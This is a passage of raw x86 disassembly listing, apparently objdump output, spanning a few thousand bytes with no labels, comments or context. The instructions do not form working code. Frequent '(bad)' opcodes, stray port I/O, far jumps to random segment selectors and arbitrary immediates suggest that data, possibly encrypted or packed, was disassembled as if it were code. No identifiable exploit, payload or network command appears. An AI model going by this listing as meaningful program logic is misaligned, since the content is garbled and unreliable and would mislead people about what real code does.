  415e7d:	sbb    eax,0x946a3502
  415e82:	or     ch,BYTE PTR [esp+ecx*2]
  415e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e86:	imul   DWORD PTR [ecx+0x76]
  415e89:	ja     0x415ecd
  415e8b:	sub    ebx,ebp
  415e8d:	sar    ah,1
  415e8f:	(bad)
  415e92:	int3   
  415e93:	es pusha 
  415e95:	outs   dx,BYTE PTR ds:[esi]
  415e96:	sub    al,0x8f
  415e98:	enter  0x98d9,0xee
  415e9c:	outs   dx,BYTE PTR ds:[esi]
  415e9d:	(bad)  
  415e9e:	imul   esp,DWORD PTR [ebp-0x69],0xffffffaf
  415ea2:	sbb    dh,bh
  415ea4:	cmp    eax,0x94cc2534
  415ea9:	jae    0x415f19
  415eab:	jp     0x415f1a
  415ead:	add    al,0x7a
  415eaf:	push   0xffffffac
  415eb1:	jnp    0x415e34
  415eb3:	sbb    ch,BYTE PTR [eax+0x35767aeb]
  415eb9:	cmp    eax,0x3677b0e6
  415ebe:	call   0x53baa910
  415ec3:	xchg   ebp,eax
  415ec4:	fild   WORD PTR [edx+0x3c223579]
  415eca:	inc    ebp
  415ecb:	mov    gs,edi
  415ecd:	sub    eax,DWORD PTR [ebp+0x1589be84]
  415ed3:	loop   0x415e8b
  415ed5:	fs jns 0x415f0e
  415ed8:	dec    DWORD PTR [ebx-0x6ce9ce37]
  415ede:	outs   dx,BYTE PTR ds:[esi]
  415edf:	xchg   edi,eax
  415ee0:	inc    edi
  415ee1:	inc    esi
  415ee2:	cmp    DWORD PTR [ecx+0x78f58873],ecx
  415ee8:	jnp    0x415ed0
  415eea:	pop    edi
  415eeb:	addr16 cmp eax,0x19557c84
  415ef1:	adc    DWORD PTR ds:0x2db84edf,esi
  415ef7:	inc    esi
  415ef8:	or     al,0x52
  415efa:	inc    ecx
  415efb:	or     DWORD PTR [esi-0x40],eax
  415efe:	lds    esp,FWORD PTR [edx]
  415f00:	add    eax,0x3771885
  415f05:	lods   eax,DWORD PTR ds:[esi]
  415f06:	xlat   BYTE PTR ds:[ebx]
  415f07:	std    
  415f08:	sbb    al,0x1c
  415f0a:	jnp    0x415f73
  415f0c:	xchg   edx,eax
  415f0d:	gs rcr al,cl
  415f10:	mov    ebp,0x4e538e92
  415f15:	xor    edx,DWORD PTR [ebp-0x162061b]
  415f1b:	idiv   bl
  415f1d:	repnz sbb al,BYTE PTR [ebx]
  415f20:	push   es
  415f21:	push   esi
  415f22:	lea    ecx,[esi+0x7b]
  415f25:	mov    bl,BYTE PTR ds:0x559a98e6
  415f2b:	pop    es
  415f2c:	cmc    
  415f2d:	fdiv   st(1),st
  415f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f30:	fst    DWORD PTR [ebx+0x46]
  415f33:	das    
  415f34:	ret    
  415f35:	dec    edi
  415f36:	jmp    0xc10b:0xd7ad0eb3
  415f3d:	inc    ebx
  415f3e:	adc    al,0x3c
  415f40:	sbb    eax,0x8a119a8b
  415f45:	mov    esp,0x6d5f2282
  415f4a:	xor    eax,0xa9ff688d
  415f4f:	mov    ah,0x93
  415f51:	(bad)  
  415f52:	and    al,0x23
  415f54:	shr    BYTE PTR [esi],1
  415f56:	xor    cl,bl
  415f58:	mov    edx,ebp
  415f5a:	xor    esp,DWORD PTR [ebp+0x1e1a7eb3]
  415f60:	cld    
  415f61:	(bad)  
  415f62:	pop    ss
  415f63:	loopne 0x415f3f
  415f65:	sub    DWORD PTR [edi+0x4a],0x2
  415f69:	push   0xd79e6829
  415f6e:	sahf   
  415f6f:	loopne 0x415fd5
  415f71:	cmp    eax,0x8b423984
  415f76:	xor    al,0x16
  415f78:	push   ebp
  415f79:	add    DWORD PTR [eax-0x39],ecx
  415f7c:	inc    esi
  415f7d:	push   ss
  415f7e:	sub    al,0x19
  415f80:	frstor [edx+0x1d]
  415f83:	adc    eax,0xd7eda2db
  415f88:	pop    esi
  415f89:	jmp    0x88e4:0xd916b85e
  415f90:	or     esi,edi
  415f92:	sbb    dl,dl
  415f94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f95:	dec    edi
  415f96:	(bad)  
  415f97:	cmp    eax,0x65cf942c
  415f9c:	mov    es,WORD PTR [esi-0x5dcdeaf7]
  415fa2:	mov    ebx,ss
  415fa4:	xor    DWORD PTR [ebx+0x60bcd99b],ecx
  415faa:	in     al,0xd7
  415fac:	jnp    0x415fba
  415fae:	push   edx
  415faf:	les    eax,FWORD PTR [ebx-0x68]
  415fb2:	inc    ecx
  415fb3:	lock jbe 0x41602b
  415fb6:	sbb    DWORD PTR [edi-0x1b],eax
  415fb9:	cli    
  415fba:	inc    ebp
  415fbb:	jnp    0x415f72
  415fbd:	out    0x6a,al
  415fbf:	ins    DWORD PTR es:[edi],dx
  415fc0:	mov    WORD PTR [eax],?
  415fc2:	out    dx,eax
  415fc3:	rol    BYTE PTR [eax],1
  415fc5:	mov    al,ds:0x8ad06d55
  415fca:	div    dh
  415fcc:	jne    0x415f69
  415fce:	outs   dx,DWORD PTR ds:[esi]
  415fcf:	jmp    DWORD PTR [ecx-0x5e]
  415fd2:	mov    dl,0x89
  415fd4:	cli    
  415fd5:	or     DWORD PTR [esi-0x6a],eax
  415fd8:	cmp    ebp,DWORD PTR [edi-0x25179cff]
  415fde:	cmp    dl,BYTE PTR [ebp-0x67]
  415fe1:	sub    BYTE PTR [eax+0x78],dl
  415fe4:	in     eax,0x97
  415fe6:	mov    eax,ds:0xe29e25a0
  415feb:	inc    eax
  415fec:	dec    esp
  415fed:	pop    ebp
  415fee:	imul   edi,DWORD PTR ds:0xd2c2a2c0,0x37
  415ff5:	push   edi
  415ff6:	push   0x59ae8396
  415ffb:	les    edx,FWORD PTR [ebp+0x5ac38db]
  416001:	mov    eax,0x657315f8
  416006:	push   ebp
  416007:	jmp    0x415faf
  416009:	or     al,0xe5
  41600c:	sub    ecx,DWORD PTR [eax+edi*8]
  41600f:	hlt    
  416010:	sbb    DWORD PTR [edx+0x36767bcb],0x3c
  416017:	mov    esp,0x97234e93
  41601c:	jecxz  0x416016
  41601e:	mov    eax,ds:0x3a348ccb
  416023:	loopne 0x416013
  416025:	call   DWORD PTR [esi]
  416027:	adc    BYTE PTR [ebp-0x12],cl
  41602a:	cmp    cl,BYTE PTR [esi+eax*2+0x11]
  41602e:	push   es
  41602f:	pop    ebp
  416030:	test   cl,al
  416032:	jecxz  0x41604e
  416034:	dec    edi
  416035:	popa   
  416036:	jae    0x41605e
  416038:	lahf   
  416039:	sub    ecx,DWORD PTR [eax-0x2d107284]
  41603f:	adc    eax,0xda0b60a7
  416044:	dec    ebx
  416045:	adc    eax,0x8ef1a7c2
  41604a:	aaa    
  41604b:	jecxz  0x41605a
  41604d:	pusha  
  41604e:	cld    
  41604f:	push   ebp
  416050:	pop    ebp
  416051:	fs loopne 0x41600b
  416054:	into   
  416055:	loope  0x416040
  416057:	inc    ecx
  416058:	iret   
  416059:	xor    ebx,DWORD PTR [ebx]
  41605b:	mov    ch,0xf
  41605d:	(bad)  
  416061:	sbb    BYTE PTR [edx-0x7dba6e68],cl
  416067:	call   0xb356eb2d
  41606c:	push   esp
  41606d:	pop    ebx
  41606e:	popa   
  41606f:	add    ch,ch
  416071:	xchg   edi,eax
  416072:	pfcmpeq mm4,mm6
  416076:	mov    ds:0xf85bca6,al
  41607b:	outs   dx,BYTE PTR ds:[esi]
  41607c:	mov    bh,0xc6
  41607e:	inc    ebx
  41607f:	repnz in al,0xcc
  416082:	mov    DWORD PTR [esi],edi
  416084:	aas    
  416085:	fcomi  st,st(7)
  416087:	push   ds
  416088:	pop    esp
  416089:	mov    al,0x6
  41608b:	stos   BYTE PTR es:[edi],al
  41608c:	sti    
  41608d:	push   es
  41608e:	loopne 0x416036
  416090:	(bad)  
  416091:	lea    eax,[edx]
  416093:	jp     0x416102
  416095:	fst    QWORD PTR [ebp+0x2e07fc49]
  41609b:	ins    BYTE PTR es:[edi],dx
  41609c:	fwait
  41609d:	mov    edx,0x52afa239
  4160a2:	add    eax,DWORD PTR [ebx]
  4160a4:	xor    eax,0x4f34cd1d
  4160a9:	adc    ebp,DWORD PTR [ecx+0x6200f465]
  4160af:	repnz pop eax
  4160b1:	xchg   BYTE PTR [eax],bl
  4160b3:	aam    0x49
  4160b5:	inc    esi
  4160b6:	repnz fcom DWORD PTR [edx]
  4160b9:	sbb    esi,DWORD PTR [edx+0x6d]
  4160bc:	and    DWORD PTR ds:0x5e509366,ecx
  4160c2:	mov    BYTE PTR [edi],dl
  4160c4:	dec    ebp
  4160c5:	out    0x6e,al
  4160c7:	mov    bl,0x30
  4160c9:	aas    
  4160ca:	rol    DWORD PTR [eax],0x8b
  4160cd:	push   ecx
  4160ce:	xor    DWORD PTR [esi-0x51],ebx
  4160d1:	in     al,dx
  4160d2:	call   0x9ea9:0x1a8a4f6
  4160d9:	out    0x73,al
  4160db:	mul    BYTE PTR [esi-0x5d]
  4160de:	lahf   
  4160df:	sbb    al,0x50
  4160e1:	repz or DWORD PTR [ebp-0x1c77761],edi
  4160e8:	pop    edx
  4160e9:	imul   ebp,DWORD PTR [ecx],0xffffffda
  4160ec:	pop    edx
  4160ed:	xor    eax,0xe51eacd2
  4160f2:	push   ecx
  4160f3:	dec    ebp
  4160f4:	push   esi
  4160f5:	mov    BYTE PTR [eax+0x78],bh
  4160f8:	adc    dh,BYTE PTR [edx+ebp*8]
  4160fb:	and    eax,0x6164adf
  416100:	cmp    BYTE PTR ds:0x8c1e55da,cl
  416106:	add    BYTE PTR [esi-0x73da4522],bh
  41610c:	mov    al,0xd3
  41610e:	das    
  41610f:	popf   
  416110:	lds    eax,FWORD PTR [ebx+esi*8+0x5c]
  416114:	(bad)  
  416115:	in     eax,dx
  416116:	mov    esp,0xfcb3ab72
  41611b:	inc    ebp
  41611c:	addr16 jbe 0x416103
  41611f:	dec    esp
  416120:	mov    eax,0x7b7928f2
  416125:	stos   DWORD PTR es:[edi],eax
  416126:	inc    ebx
  416127:	call   0xa9b42d24
  41612c:	call   0xb958752d
  416131:	ins    BYTE PTR es:[edi],dx
  416132:	lds    edx,FWORD PTR [ebx+0x375c972f]
  416138:	mov    al,0xda
  41613a:	lods   eax,DWORD PTR ds:[esi]
  41613b:	pop    esi
  41613c:	add    bh,BYTE PTR [eax]
  41613e:	(bad)  
  41613f:	add    cl,BYTE PTR [ebx-0x10463023]
  416145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416146:	and    eax,0x33f24f8c
  41614b:	repnz and ecx,DWORD PTR [ecx+0x4a]
  41614f:	retf   
  416150:	dec    ecx
  416151:	sbb    BYTE PTR [edi],bh
  416153:	pop    edi
  416154:	sub    DWORD PTR [ebp-0x7e963b53],esp
  41615a:	jecxz  0x416167
  41615c:	xor    eax,0x71790ca6
  416161:	mov    edi,edi
  416163:	shr    DWORD PTR [ebx-0x17fd45ec],1
  416169:	jmp    0x1289100
  41616e:	adc    eax,DWORD PTR ds:0x74780607
  416174:	cmc    
  416175:	dec    esi
  416176:	sbb    ecx,0x7e
  416179:	pop    esi
  41617a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41617b:	xchg   ebx,eax
  41617c:	cmp    eax,0xee7e010f
  416181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416182:	and    eax,DWORD PTR [ebx]
  416184:	mov    fs,esp
  416186:	xchg   DWORD PTR [ecx-0x39f34dfc],esi
  41618c:	xor    eax,0xa13a77d3
  416191:	and    BYTE PTR [esi+0x68],bh
  416194:	mov    ds:0x86580a,eax
  416199:	push   esp
  41619a:	das    
  41619b:	pop    esi
  41619c:	mov    edx,0x3cb23f3a
  4161a1:	out    0x45,al
  4161a3:	mov    ebx,0xa52b5035
  4161a8:	jno    0x4161f9
  4161aa:	adc    ax,0x474e
  4161ae:	jo     0x41622c
  4161b0:	and    BYTE PTR [ecx-0xd04c89c],0xf1
  4161b7:	fldenv ds:0x4263b8c5
  4161bd:	pop    edi
  4161be:	jmp    0x416161
  4161c0:	cmc    
  4161c1:	xchg   edx,eax
  4161c2:	fs push esp
  4161c4:	daa    
  4161c5:	mov    ebx,0xbf960641
  4161ca:	adc    bl,BYTE PTR [eax]
  4161cc:	call   0x84adc654
  4161d1:	dec    edi
  4161d2:	pushf  
  4161d3:	shl    DWORD PTR [edi],cl
  4161d5:	(bad)  
  4161d6:	dec    edx
  4161d7:	shl    ecx,cl
  4161d9:	xchg   edx,eax
  4161da:	clc    
  4161db:	cmp    al,BYTE PTR [edi+eax*1]
  4161de:	cli    
  4161df:	out    0x2,al
  4161e1:	mov    ds:0x716d4891,al
  4161e6:	sub    ebx,DWORD PTR [eax+0x38]
  4161e9:	sbb    al,0x30
  4161eb:	pop    edi
  4161ec:	xor    esi,DWORD PTR [eax+0x6049778a]
  4161f2:	mov    ds:0x69c14e9e,al
  4161f7:	pusha  
  4161f8:	and    ebx,DWORD PTR [ebx-0x282473aa]
  4161fe:	or     edx,DWORD PTR [eax+0x29bc4561]
  416204:	add    ebx,0xabf5c372
  41620a:	lds    ecx,FWORD PTR [ebx+0x4626d535]
  416210:	int3   
  416211:	pusha  
  416212:	(bad)
  416215:	add    bl,0x9c
  416218:	add    eax,0xf5c149fb
  41621d:	xor    DWORD PTR [esi-0x5d],eax
  416220:	cld    
  416221:	xor    DWORD PTR [ebp+0x49cf9279],eax
  416227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416228:	mov    BYTE PTR [ebx-0x71],cl
  41622b:	pop    es
  41622c:	rol    DWORD PTR [edi-0x3f],1
  41622f:	dec    edx
  416230:	dec    eax
  416231:	or     al,0xb9
  416233:	lock stos DWORD PTR es:[edi],eax
  416235:	mov    esp,0x4d6f033d
  41623a:	lods   eax,DWORD PTR ds:[esi]
  41623b:	or     al,BYTE PTR [ebx]
  41623d:	push   esp
  41623e:	fmul   DWORD PTR [ebp+ebx*8+0x6d880497]
  416245:	xchg   ebp,eax
  416246:	je     0x4161df
  416248:	cmp    ecx,DWORD PTR cs:[edi]
  41624b:	jo     0x4162c8
  41624d:	jl     0x4161d6
  41624f:	inc    ebp
  416250:	mov    esi,0x68c7b4da
  416255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416256:	call   0x22c5:0x54004871
  41625d:	or     esi,ebx
  41625f:	push   edi
  416260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416261:	pop    ecx
  416262:	push   edx
  416263:	cmp    DWORD PTR [edi],ecx
  416265:	inc    ecx
  416266:	push   esp
  416267:	sbb    eax,0x7fbfae20
  41626c:	cmp    ch,0xa5
  41626f:	mov    bl,0x10
  416271:	out    0xe0,al
  416273:	iret   
  416274:	clc    
  416275:	repnz sti 
  416277:	sbb    BYTE PTR [edi],dl
  416279:	push   ebx
  41627a:	jp     0x4162f5
  41627c:	or     eax,0xf8306c00
  416281:	dec    esp
  416282:	xchg   ebx,eax
  416283:	mov    ah,0x24
  416285:	add    DWORD PTR [edx-0x215b189c],esp
  41628b:	inc    edx
  41628c:	or     ebx,DWORD PTR [ebx+0x16]
  41628f:	daa    
  416290:	ins    BYTE PTR es:[edi],dx
  416291:	ret    0x7cb
  416294:	mov    ds:0xc5dbb542,eax
  416299:	jb     0x41630d
  41629b:	sbb    DWORD PTR [eax-0x4e],edi
  41629e:	sub    ebx,ebx
  4162a0:	sahf   
  4162a1:	sbb    BYTE PTR [ecx-0x4cfb97bd],ah
  4162a7:	test   DWORD PTR [edx],edi
  4162a9:	cdq    
  4162aa:	fstp   st(7)
  4162ac:	test   eax,0x9353f7d0
  4162b1:	sub    ebx,ecx
  4162b3:	je     0x4162c0
  4162b5:	mov    dh,0xe0
  4162b7:	fs je  0x416302
  4162ba:	dec    ecx
  4162bb:	test   al,0x8a
  4162bd:	rcr    BYTE PTR [eax-0x4d9033b6],0xc4
  4162c4:	xor    al,0xe9
  4162c6:	or     BYTE PTR [edx+0x5602be70],dh
  4162cc:	xchg   edx,eax
  4162cd:	xor    al,0x20
  4162cf:	push   ebp
  4162d0:	retf   
  4162d1:	ret    
  4162d2:	sub    cl,BYTE PTR [edi-0x54c36ae0]
  4162d8:	scas   al,BYTE PTR es:[edi]
  4162d9:	dec    esp
  4162da:	neg    dh
  4162dc:	xor    al,0x4d
  4162de:	in     eax,dx
  4162df:	mov    bh,0xb1
  4162e1:	ror    bh,1
  4162e3:	mov    ecx,0xea2303d0
  4162e8:	mov    eax,0x37cd0a4a
  4162ed:	ja     0x416298
  4162ef:	test   BYTE PTR [ecx],dl
  4162f1:	xchg   edx,eax
  4162f2:	lahf   
  4162f3:	sub    edi,DWORD PTR [edx+edx*8]
  4162f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162f7:	pop    esp
  4162f8:	dec    esi
  4162f9:	jg     0x4162f8
  4162fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162fc:	adc    eax,0x8ef2cf04
  416301:	sbb    BYTE PTR [ebx+0x2c],dh
  416304:	push   es
  416305:	divps  xmm4,XMMWORD PTR [edi+0x3a]
  416309:	cwde   
  41630a:	nop
  41630b:	dec    ebx
  41630c:	dec    esp
  41630d:	jo     0x416338
  41630f:	jl     0x416352
  416311:	mov    dl,0xd1
  416313:	cmp    BYTE PTR [ebx],ah
  416315:	fadd   DWORD PTR [edx+0x76d9dc80]
  41631b:	or     eax,0xc5150d3f
  416320:	pop    es
  416321:	jecxz  0x41639d
  416323:	int    0x73
  416325:	xchg   ebp,eax
  416326:	and    al,0x9c
  416328:	mov    ch,0xe
  41632a:	aas    
  41632b:	loop   0x4163a9
  41632d:	jmp    0x41636c
  41632f:	leave  
  416330:	popa   
  416331:	out    dx,eax
  416332:	push   ds
  416333:	cs and al,0xde
  416336:	adc    al,0x18
  416338:	push   ecx
  416339:	arpl   WORD PTR [eax-0x3ab3c61e],dx
  41633f:	add    cl,dh
  416341:	push   ds
  416342:	inc    ebx
  416343:	sub    BYTE PTR [ebx+esi*8],bh
  416346:	ins    BYTE PTR es:[edi],dx
  416347:	and    eax,0x6c3adae3
  41634c:	adc    BYTE PTR [ebp+0x34],cl
  41634f:	adc    al,cl
  416351:	mov    eax,ds:0x9d3229ed
  416356:	cmc    
  416357:	js     0x4162db
  416359:	(bad)  
  41635a:	xlat   BYTE PTR ds:[ebx]
  41635b:	mov    DWORD PTR cs:[edx+0x30],0x9b5b5c9e
  416363:	mov    ebx,0xdbb30e87
  416368:	inc    eax
  416369:	dec    edx
  41636a:	adc    al,0xe4
  41636c:	cwde   
  41636d:	ins    DWORD PTR es:[edi],dx
  41636e:	mov    WORD PTR [ebx],?
  416370:	lds    esp,FWORD PTR [ebx]
  416372:	push   ecx
  416373:	loope  0x416387
  416375:	fcmovne st,st(1)
  416377:	in     eax,0x91
  416379:	cmp    BYTE PTR cs:[edx+0x741ba2ff],dl
  416380:	xor    ecx,DWORD PTR [eax+0x5e]
  416383:	cwde   
  416384:	adc    dh,bl
  416386:	ins    DWORD PTR es:[edi],dx
  416387:	and    dh,dh
  416389:	xor    DWORD PTR [esi],0x8b54d393
  41638f:	mov    eax,ds:0xb6798d7c
  416394:	xor    DWORD PTR [edx+0x5750d106],edx
  41639a:	int3   
  41639b:	rol    eax,0xfb
  41639e:	aad    0xa6
  4163a0:	cs mov bh,0x5f
  4163a3:	jecxz  0x41632d
  4163a5:	es out dx,al
  4163a7:	test   al,0xf7
  4163a9:	lods   al,BYTE PTR ds:[esi]
  4163aa:	mov    eax,ds:0xcf125d28
  4163af:	mov    ds:0x78254ed0,al
  4163b4:	xchg   edi,eax
  4163b5:	ret    
  4163b6:	and    ecx,DWORD PTR [edi+ebx*1+0x31700d5]
  4163bd:	call   0xace430f9
  4163c2:	pop    es
  4163c3:	add    ch,BYTE PTR [ebp+0x67d2a224]
  4163c9:	adc    al,0x7
  4163cb:	mov    edi,0x9a541af4
  4163d0:	or     esp,ebp
  4163d2:	imul   edx,DWORD PTR [edi+0x65e35765],0x1b
  4163d9:	repnz sub al,0x7e
  4163dc:	popf   
  4163dd:	sub    eax,0xea620dab
  4163e2:	ja     0x416418
  4163e4:	fidivr WORD PTR [edx-0x47]
  4163e7:	out    dx,eax
  4163e8:	mov    eax,ds:0x776a08db
  4163ed:	push   ecx
  4163ee:	xchg   DWORD PTR [eax-0x50cac210],edx
  4163f4:	xchg   esi,edi
  4163f6:	add    DWORD PTR [eax-0x28],esp
  4163f9:	fcomp  DWORD PTR [ecx-0x6e]
  4163fc:	imul   edx,DWORD PTR [edx-0x6b77d76b],0x8161cbc3
  416406:	xor    ebp,DWORD PTR [esi]
  416408:	stos   BYTE PTR es:[edi],al
  416409:	mov    WORD PTR [edx-0x7e69e1e4],es
  41640f:	dec    ebx
  416410:	lds    eax,FWORD PTR [ebx]
  416412:	dec    ebx
  416413:	mov    edi,0x297de3ba
  416418:	sub    eax,0xc0b556ce
  41641d:	imul   esp,esi,0xc349a441
  416423:	push   esp
  416424:	dec    edi
  416425:	ja     0x416409
  416427:	mov    WORD PTR [edi],es
  416429:	sbb    ah,BYTE PTR [eax+0x33c213be]
  41642f:	sub    DWORD PTR [eax-0x50aed36b],0xffffffdf
  416436:	loop   0x416480
  416438:	mov    DWORD PTR [eax+0x8],edx
  41643b:	pop    ebx
  41643c:	arpl   WORD PTR [edi-0x44fbc05c],bp
  416442:	call   0x9a401bd3
  416447:	ror    DWORD PTR [edi+0x2d],1
  41644a:	cmp    edx,DWORD PTR [edi+ecx*8+0x7784a03c]
  416451:	inc    ebp
  416452:	mov    dh,0xf7
  416454:	pushf  
  416455:	adc    DWORD PTR [ebx+0x80aa399],esp
  41645b:	pop    ds
  41645c:	aas    
  41645d:	fldcw  WORD PTR [edx+0x68]
  416460:	mov    dl,0x82
  416462:	(bad)  
  416463:	or     eax,0x9e5b4914
  416468:	fild   WORD PTR ds:[ebp+0x4a]
  41646c:	imul   ecx,ebp,0xe74cc57b
  416472:	dec    bp
  416474:	or     eax,0x785299b7
  416479:	adc    dh,BYTE PTR [edi+0x2b]
  41647c:	sub    BYTE PTR [ecx-0x63b82a9a],al
  416482:	pop    esi
  416483:	add    eax,0xe0950dd3
  416488:	rcl    BYTE PTR [ebx+esi*2-0x7096bc32],cl
  41648f:	jne    0x416471
  416491:	stos   DWORD PTR es:[edi],eax
  416492:	call   0x8e6d:0x3d9a7317
  416499:	add    BYTE PTR [eax+0xf],al
  41649c:	pop    ss
  41649d:	sbb    DWORD PTR [edi],eax
  41649f:	sar    BYTE PTR [esi+0x47],cl
  4164a2:	push   ebx
  4164a3:	pushf  
  4164a4:	mov    esp,DWORD PTR [ecx]
  4164a6:	rol    BYTE PTR [esi],0xb6
  4164a9:	jmp    ecx
  4164ab:	and    bl,cl
  4164ad:	mov    ds:0x4d78a1ac,al
  4164b2:	loopne 0x416440
  4164b4:	add    ah,BYTE PTR [edi]
  4164b6:	pop    eax
  4164b7:	mov    ds:0x4250c636,eax
  4164bc:	ins    DWORD PTR es:[edi],dx
  4164bd:	icebp  
  4164be:	xchg   DWORD PTR [eax],ebx
  4164c0:	mov    esi,0xba88fe1
  4164c5:	mov    ch,0x29
  4164c7:	mov    ebx,es
  4164c9:	push   edi
  4164ca:	pushf  
  4164cb:	sbb    eax,0x3d5a024e
  4164d0:	jmp    0x41652b
  4164d2:	and    ah,cl
  4164d4:	xor    edx,DWORD PTR [ebx+0x3a]
  4164d7:	jmp    0xc9a:0xe7f4e3f0
  4164de:	loopne 0x4164b9
  4164e0:	fsub   DWORD PTR [esi+0x12]
  4164e3:	inc    esp
  4164e4:	rcr    edx,0x7d
  4164e7:	pop    ebx
  4164e8:	std    
  4164e9:	dec    ecx
  4164ea:	mov    ebp,0x6abe74f4
  4164ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164f0:	dec    edi
  4164f1:	fucom  st(5)
  4164f3:	dec    eax
  4164f4:	sub    al,0x5f
  4164f6:	add    ebp,esp
  4164f8:	jmp    0x416491
  4164fa:	jmp    0x5adccdbb
  4164ff:	retf   0x1fc5
  416502:	cmp    eax,0xb4cd1143
  416507:	repz pop es
  416509:	hlt    
  41650a:	xchg   edx,eax
  41650b:	jg     0x416566
  41650d:	ret    
  41650e:	(bad)  
  416510:	test   eax,0xefaf01b4
  416515:	ds (bad) 
  416518:	fisubr WORD PTR [ebp-0x57cdbd08]
  41651e:	cwde   
  41651f:	sub    BYTE PTR [eax-0x70cc850d],bl
  416525:	popa   
  416526:	cld    
  416527:	fnsave [ecx+0xb66fa2e]
  41652d:	mov    ah,0xa8
  41652f:	dec    ecx
  416530:	mov    ebp,DWORD PTR [ebx+edi*2-0x4617fbb3]
  416537:	jno    0x4164e4
  416539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41653a:	mov    ah,0xa3
  41653c:	pop    ds
  41653d:	mov    ds:0xcfadb297,al
  416542:	shl    DWORD PTR [edx+0x5b88af8],0xc8
  416549:	and    al,0xce
  41654b:	push   0x1
  41654d:	mov    BYTE PTR [edx-0x2d],cl
  416550:	stos   BYTE PTR es:[edi],al
  416551:	idiv   dl
  416553:	pop    es
  416554:	mov    dl,0xb2
  416556:	and    BYTE PTR [ecx],al
  416558:	(bad)  [esi+esi*2]
  41655b:	aam    0x1e
  41655d:	sub    bh,ah
  41655f:	sti    
  416560:	inc    ecx
  416561:	fs jle 0x416571
  416564:	push   esp
  416565:	mov    WORD PTR [esi-0x75],?
  416568:	or     esp,edi
  41656a:	loope  0x41653c
  41656c:	rcr    BYTE PTR [edx+eax*4-0x26],0xb7
  416571:	pop    es
  416572:	mov    ch,0xe
  416574:	add    DWORD PTR [edx-0x9a3653b],esi
  41657a:	sti    
  41657b:	ret    0xe551
  41657e:	cwde   
  41657f:	sub    BYTE PTR [ebx],ah
  416581:	mov    cs,WORD PTR [esi-0x30]
  416584:	xlat   BYTE PTR ds:[ebx]
  416585:	in     al,0x71
  416587:	push   ss
  416588:	mov    al,ds:0xf54984af
  41658d:	sbb    DWORD PTR [esi+0x781d4c68],eax
  416593:	pop    ecx
  416594:	adc    dl,dl
  416596:	push   ecx
  416597:	xchg   BYTE PTR [edi],bl
  416599:	lods   eax,DWORD PTR ds:[esi]
  41659a:	lods   eax,DWORD PTR ds:[esi]
  41659b:	jg     0x416603
  41659d:	inc    esp
  41659e:	cmp    dh,bh
  4165a0:	cmp    al,BYTE PTR [ecx+ecx*8+0x4d]
  4165a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165a5:	pop    esp
  4165a6:	mov    esp,0xd9f57f9b
  4165ab:	mov    esp,0x7bea9395
  4165b0:	test   eax,0xcf9b00be
  4165b5:	jle    0x4165c4
  4165b7:	push   ebx
  4165b8:	add    al,BYTE PTR [edi+0x4e]
  4165bb:	in     eax,0x47
  4165bd:	fisubr DWORD PTR [esi+0x7a]
  4165c0:	push   cs
  4165c1:	cmp    ch,BYTE PTR ds:0x247618f8
  4165c7:	mov    ds:0x3c32a9fe,al
  4165cc:	mov    BYTE PTR [ecx],ch
  4165ce:	stc    
  4165cf:	lahf   
  4165d0:	loopne 0x416603
  4165d2:	out    dx,al
  4165d3:	ret    
  4165d4:	gs sbb al,0xd6
  4165d7:	les    ecx,FWORD PTR [esi+ebp*2]
  4165da:	mov    edx,0xca6062ea
  4165df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165e0:	bound  edx,QWORD PTR [ebx+0x3006b1cf]
  4165e6:	xchg   DWORD PTR [ecx+0x32],esp
  4165e9:	push   ecx
  4165ea:	loope  0x416634
  4165ec:	shl    DWORD PTR [esi-0x27],0xf2
  4165f0:	fs scas eax,DWORD PTR es:[edi]
  4165f2:	sub    al,0xbf
  4165f4:	inc    esp
  4165f5:	ds loope 0x41665f
  4165f8:	cmp    eax,0xfe7d8fde
  4165fd:	sbb    bh,bl
  4165ff:	xor    DWORD PTR [edi+0x16f34e74],ecx
  416605:	inc    esi
  416606:	inc    ebx
  416607:	push   es
  416608:	push   ss
  416609:	imul   ebp,DWORD PTR [ebx-0x60],0xeba9d15a
  416610:	mov    al,0x5e
  416612:	jns    0x4165c3
  416614:	add    cl,BYTE PTR [edx-0x2f93570f]
  41661a:	lea    esp,[edx+0x3cf9af53]
  416620:	xchg   edx,eax
  416621:	cmp    al,0x7e
  416623:	fucom  st(5)
  416625:	pop    edi
  416626:	test   al,ah
  416628:	jb     0x416615
  41662a:	xchg   edx,eax
  41662b:	aaa    
  41662c:	dec    eax
  41662d:	imul   edx,eax,0x17
  416630:	ins    DWORD PTR es:[edi],dx
  416631:	fs pushf 
  416633:	cmp    DWORD PTR [esi+0x8],eax
  416636:	shl    DWORD PTR [ebx-0x14480283],1
  41663c:	retf   
  41663d:	cli    
  41663e:	rcr    DWORD PTR [edx+0x4],0x12
  416642:	xor    al,0x18
  416644:	int3   
  416645:	push   edx
  416646:	ret    
  416647:	sbb    ah,BYTE PTR [esp+ebx*8+0x6d]
  41664b:	xor    al,0x97
  41664d:	dec    edx
  41664e:	gs icebp 
  416650:	fwait
  416651:	iret   
  416652:	aaa    
  416653:	shl    BYTE PTR [ebx],cl
  416655:	push   ds
  416656:	pop    ecx
  416657:	add    BYTE PTR [ebp-0x129b1d4e],bh
  41665d:	rcr    BYTE PTR [esi+0x18e0b101],cl
  416663:	cwde   
  416664:	or     bh,BYTE PTR [ecx+edx*4+0x74]
  416668:	jo     0x4166ce
  41666a:	js     0x416694
  41666c:	ret    
  41666d:	cmc    
  41666e:	arpl   bp,si
  416670:	cmp    al,0xf8
  416672:	inc    esp
  416673:	xchg   dh,dh
  416675:	addr16 mov ch,0x5f
  416678:	xor    BYTE PTR [esi-0x23383438],bl
